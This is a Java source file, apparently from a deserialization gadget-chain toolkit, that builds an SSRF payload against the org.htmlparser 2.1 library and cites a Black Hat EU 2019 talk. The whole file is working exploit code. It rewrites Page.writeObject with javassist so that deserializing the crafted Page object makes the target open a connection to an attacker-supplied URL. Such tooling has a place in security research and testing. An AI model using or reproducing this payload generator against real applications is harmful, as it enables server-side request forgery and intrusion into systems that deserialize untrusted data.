package org.ses.gadgetbuilder.chains1;

import javassist.*;
import org.htmlparser.lexer.Page;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.GadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.NoTrampoline;

/**
 * https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf
 */
@Dependencies({"org.htmlparser:2.1"})
@Authors({Authors.YONGTAO, Authors.LZHANG, Authors.KCHAI})
@Impact(Impact.SSRF)
public class HTMLParser extends GadgetChain<NoTrampoline> {

    public HTMLParser() {
        super(NoTrampoline.getInstance());
    }
    public HTMLParser(NoTrampoline _trampoline) {
        super(_trampoline);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {

        modifyWriteObject();

        Page p = new Page();
        p.setBaseUrl(command);
        p.setUrl(command);
        return new TrampolineConnector(p);
    }

    private void modifyWriteObject() throws NotFoundException, CannotCompileException {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.get("org.htmlparser.lexer.Page");
        CtMethod writeObjectMethod = ctClass.getDeclaredMethod("writeObject");
        ctClass.removeMethod(writeObjectMethod);

        // we need to modify our side's writeObject method to satisfy the if (fromurl) condition in readObject
        ctClass.addMethod(CtNewMethod.make("private void writeObject(java.io.ObjectOutputStream out) throws java.io.IOException {" +
                "String href = this.getUrl(); " +
                "out.writeBoolean(true); out.writeInt(10); " +
                "out.writeObject(href); out.defaultWriteObject(); }", ctClass));


        ctClass.toClass();
    }

    @Override
    protected void postProcessPayload() throws Exception {

    }

    @Override
    protected String getStackTrace() {
        return "org.htmlparser.lexer.Page.readObject()\n"+
                "java.net.URL.openConnection()";
    }
}
